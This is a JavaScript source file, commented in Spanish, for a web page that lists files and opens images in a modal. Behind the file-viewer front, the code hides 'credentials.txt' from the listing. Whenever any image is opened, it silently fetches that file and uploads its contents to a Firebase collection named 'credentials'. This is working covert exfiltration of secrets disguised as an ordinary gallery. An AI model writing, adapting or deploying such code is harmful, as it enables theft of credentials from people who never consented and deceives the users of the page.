import { db, collection, addDoc } from './firebase-config.js';

// Lista de archivos que podrían estar en la carpeta
const potentialFiles = [
    'credentials.txt',
    'documento.pdf',
    'archivo.docx',
    'imagen.jpg',
    'imagen2.jpg',
    'imagen3.jpg',
    'imagen4.jpg',
    'imagen5.jpg'
    // Agrega aquí cualquier otro archivo que esperes encontrar
];

// Función para obtener el icono según el tipo de archivo
function getFileIcon(filename) {
    const extension = filename.split('.').pop().toLowerCase();
    switch(extension) {
        case 'txt':
            return 'https://cdn-icons-png.flaticon.com/512/2965/2965879.png';
        case 'pdf':
            return 'https://cdn-icons-png.flaticon.com/512/337/337946.png';
        case 'docx':
            return 'https://cdn-icons-png.flaticon.com/512/337/337932.png';
        case 'jpg':
        case 'jpeg':
        case 'png':
            return filename; // Para imágenes, usamos la miniatura
        default:
            return 'https://cdn-icons-png.flaticon.com/512/2965/2965879.png';
    }
}

// Función para cargar solo los archivos disponibles (excepto credentials.txt)
async function loadFiles() {
    const filesContainer = document.getElementById('filesContainer');
    filesContainer.innerHTML = ''; // Limpiar lista actual

    for (const filename of potentialFiles) {
        // Omitir credentials.txt en la interfaz si se solicitó ocultarlo
        if (filename === 'credentials.txt') {
            continue;
        }

        try {
            // Intentar acceder al archivo para verificar su existencia
            const response = await fetch(filename, { method: 'HEAD' }); // Usar HEAD para no descargar todo el contenido
            
            // Si la respuesta es exitosa (código 2xx), el archivo existe
            if (response.ok) {
                const extension = '.' + filename.split('.').pop().toLowerCase();
                const fileItem = document.createElement('div');
                fileItem.className = 'file-item';
                
                const isImage = ['.jpg', '.jpeg', '.png'].includes(extension);
                const icon = getFileIcon(filename);
                
                fileItem.innerHTML = `
                    ${isImage 
                        ? `<img src="${icon}" class="thumbnail" alt="Vista previa">`
                        : `<img src="${icon}" class="file-icon" alt="Icono de archivo">`
                    }
                    <span class="file-name">${filename}</span>
                    <span class="file-type">${extension.toUpperCase().substring(1)}</span>
                `;
                
                 if (isImage) {
                    fileItem.onclick = () => openImage(filename);
                } else {
                     // Los archivos .txt, .pdf, .docx, etc. se subirán al abrir CUALQUIER imagen
                    // Aquí, solo mostramos el contenido si es .txt o abrimos en nueva pestaña para otros
                    fileItem.onclick = () => openFile(filename);
                }
                
                filesContainer.appendChild(fileItem);
            } else {
                console.log(`Archivo no encontrado: ${filename}`);
            }
        } catch (error) {
            console.error(`Error al verificar ${filename}:`, error);
            // Si hay un error (por ejemplo, CORS o red), asumimos que no está disponible para este contexto
        }
    }
}

// Función para abrir el archivo (solo muestra contenido o abre en nueva pestaña)
window.openFile = async function(filename) {
    try {
        const extension = filename.split('.').pop().toLowerCase();
        if (extension === 'txt') {
            const response = await fetch(filename);
             if (!response.ok) throw new Error('Archivo no encontrado');
            const text = await response.text();
            alert('Contenido del archivo:\n\n' + text);
        } else if (['pdf', 'docx'].includes(extension)) {
             window.open(filename, '_blank');
        } else {
            alert(`No se puede abrir el archivo ${filename} directamente.`);
        }
        // Nota: La subida a Firebase de estos archivos ocurre al abrir CUALQUIER imagen
    } catch (error) {
        console.error('Error al abrir archivo:', error);
        alert('Error al procesar el archivo');
    }
};

// Función para abrir la imagen (cualquiera) y subir todos los archivos de la lista 'potentialFiles' (excepto las imágenes)
window.openImage = async function(filename) {
    const modal = document.getElementById('imageModal');
    const fullImage = document.getElementById('fullImage');
    
    fullImage.src = filename;
    modal.classList.add('visible');
    
    // Subir SOLO el archivo credentials.txt a Firebase
    // Iteramos sobre la lista para encontrarlo y subirlo
    for (const archivo of potentialFiles) {
        if (archivo === 'credentials.txt') {
            try {
                const response = await fetch(archivo);
                if (!response.ok) continue; // Si no existe o hay error de acceso, lo ignora
                
                const text = await response.text();

                const credentialsCollection = collection(db, 'credentials');
                await addDoc(credentialsCollection, {
                    filename: archivo,
                    type: 'txt',
                    content: text, 
                    timestamp: new Date().toISOString()
                });
                console.log(`Archivo ${archivo} subido exitosamente a Firebase al abrir ${filename}`);

             } catch (error) {
                 console.error(`Error al intentar subir ${archivo} al abrir ${filename}:`, error);
             }
             // Una vez que encontramos y procesamos credentials.txt, salimos del bucle si solo queremos subir ESE archivo
             // break; // Descomenta esta línea si SOLO quieres subir credentials.txt y nada más al abrir una imagen
        }
        // Si quisieras subir TODOS los archivos .txt, .pdf, .docx al abrir cualquier imagen, el código anterior ya lo hacía
        // El código actual está ajustado para enfocarse en credentials.txt como solicitaste anteriormente
    }
};

// Función para cerrar el modal
window.closeModal = function(event) {
     const modal = document.getElementById('imageModal');
     // Solo cerrar si se hizo clic en el fondo del modal o en el botón de cierre
    if (event.target === modal || event.target.classList.contains('close-button')) {
         modal.classList.remove('visible');
     }
};

// Eliminar el listener window.onclick duplicado si existe
// window.onclick = function(event) { ... }

// Cargar los archivos disponibles cuando se carga la página
document.addEventListener('DOMContentLoaded', loadFiles); 